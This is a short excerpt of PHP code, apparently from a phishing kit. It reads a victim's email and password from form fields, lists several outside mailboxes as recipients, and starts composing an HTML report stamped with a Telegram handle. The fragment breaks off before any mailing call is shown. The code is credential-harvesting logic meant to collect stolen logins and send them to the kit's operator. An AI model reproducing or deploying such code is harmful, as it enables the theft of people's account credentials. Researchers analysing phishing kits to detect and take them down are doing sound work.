...
$login = $_POST['email-amg'];
$passwd = $_POST['pass-amg'];
$own = 'logs.me@yandex.com, amginbox@mail.com, amginbox@outlook.com, kingapel@vivaldi.net';
...
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>____AMG-TELEGRAM: @amgghostserver____</td></tr>
